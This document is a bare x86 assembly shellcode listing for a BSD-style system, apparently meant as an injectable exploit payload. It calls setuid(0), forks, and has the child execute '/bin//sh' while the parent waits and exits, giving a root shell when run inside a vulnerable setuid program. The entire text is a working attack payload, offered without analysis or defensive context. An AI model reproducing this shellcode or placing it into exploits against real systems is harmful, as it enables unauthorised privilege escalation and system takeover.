   jmp start
do_exit:                                
   xor     eax, eax
   push    eax      
   inc     eax
   push    eax   
   int     0x80   // exit(0)
start:                  
   xor     eax, eax      
   push    eax
   push    eax
   mov     al, 23
   int     0x80   // setuid(0)
   pop     eax
   inc     eax            
   inc     eax            
   int     0x80   // fork()
   pop     ebx
   push    eax            
   push    ebx            
   push    ebx            
   push    ebx            
   push    eax            
   xor     eax, eax      
   mov     al,7
   push    eax
   int     0x80   // wait4( child ) - fails in child
   pop     ebx
   pop     ebx            
   cmp     ebx, eax      
   je      do_exit         
do_sh:                                  
   xor     eax,eax       
   push    eax            
   push    0x68732f2f     
   push    0x6e69622f     
   mov     ebx, esp 
   push    eax            
   push    esp            
   push    esp            
   push    ebx            
   mov     al, 0x3b
   push    eax
   int     0x80   // execve( '/bin//sh' )
